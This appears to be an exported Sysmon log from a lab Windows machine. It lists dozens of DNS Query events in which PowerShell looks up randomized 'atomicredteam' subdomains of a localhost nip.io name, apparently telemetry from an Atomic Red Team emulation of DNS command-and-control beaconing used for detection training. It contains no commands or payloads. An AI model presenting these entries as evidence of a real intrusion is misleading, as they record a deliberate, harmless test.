"2025-12-22 13:58:36.993 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165875,"Query: atomicredteam-134039.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:36.166","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:36.994 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165876,"Query: atomicredteam-652558.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:36.483","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:36.994 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165877,"Query: atomicredteam-449030.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:36.525","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:36.994 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165878,"Query: atomicredteam-444635.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:36.566","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:36.994 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165879,"Query: atomicredteam-389000.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:36.748","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:37.995 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165880,"Query: atomicredteam-101430.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:36.790","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:37.995 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165881,"Query: atomicredteam-306941.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:36.833","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:37.995 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165882,"Query: atomicredteam-391266.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:37.014","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:37.995 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165883,"Query: atomicredteam-185778.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:37.332","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:37.995 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165884,"Query: atomicredteam-735412.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:37.375","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:37.995 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165885,"Query: atomicredteam-342163.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:37.418","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:37.995 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165886,"Query: atomicredteam-972763.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:37.461","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:37.995 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165887,"Query: atomicredteam-697786.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:37.503","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:37.995 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165888,"Query: atomicredteam-62142.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:37.545","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:37.995 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165889,"Query: atomicredteam-906435.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:37.586","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:37.995 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165890,"Query: atomicredteam-114682.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:37.905","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:37.995 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165891,"Query: atomicredteam-653512.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:37.950","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:38.996 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165892,"Query: atomicredteam-342246.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:37.992","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:38.996 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165893,"Query: atomicredteam-333156.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:38.032","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:38.996 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165894,"Query: atomicredteam-452839.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:38.075","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:38.996 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165895,"Query: atomicredteam-664926.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:38.246","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:38.996 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165896,"Query: atomicredteam-797598.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:38.290","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:38.997 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165897,"Query: atomicredteam-107366.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:38.334","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:38.997 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165898,"Query: atomicredteam-967414.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:38.378","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:38.997 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165899,"Query: atomicredteam-336401.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:38.421","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:38.997 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165900,"Query: atomicredteam-310753.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:38.463","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:38.997 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165901,"Query: atomicredteam-711451.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:38.505","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:38.997 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165902,"Query: atomicredteam-288846.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:38.548","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:38.997 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165903,"Query: atomicredteam-127756.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:38.590","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:38.997 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165904,"Query: atomicredteam-462951.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:38.635","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:38.997 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165905,"Query: atomicredteam-814540.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:38.679","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:38.997 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165906,"Query: atomicredteam-475590.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:38.722","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:38.997 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165907,"Query: atomicredteam-19679.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:38.766","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:38.997 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165908,"Query: atomicredteam-832344.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:38.810","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:38.997 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165909,"Query: atomicredteam-42905.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:38.853","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:38.997 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165910,"Query: atomicredteam-987921.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:38.895","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:38.997 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165911,"Query: atomicredteam-525245.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:38.939","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:39.997 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165912,"Query: atomicredteam-348700.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:38.980","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:39.997 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165913,"Query: atomicredteam-497600.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:39.022","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:39.997 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165914,"Query: atomicredteam-93773.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:39.065","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:39.998 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165915,"Query: atomicredteam-578015.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:39.108","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:39.998 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165916,"Query: atomicredteam-447270.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:39.151","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:39.998 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165917,"Query: atomicredteam-160864.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:39.195","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:39.998 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165918,"Query: atomicredteam-508152.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:39.365","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:39.998 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165919,"Query: atomicredteam-546245.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:39.409","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:39.999 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165920,"Query: atomicredteam-677806.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:39.453","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:39.999 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165921,"Query: atomicredteam-424225.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:39.496","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:39.999 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165922,"Query: atomicredteam-798520.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:39.540","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:39.999 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165923,"Query: atomicredteam-80052.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:39.584","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
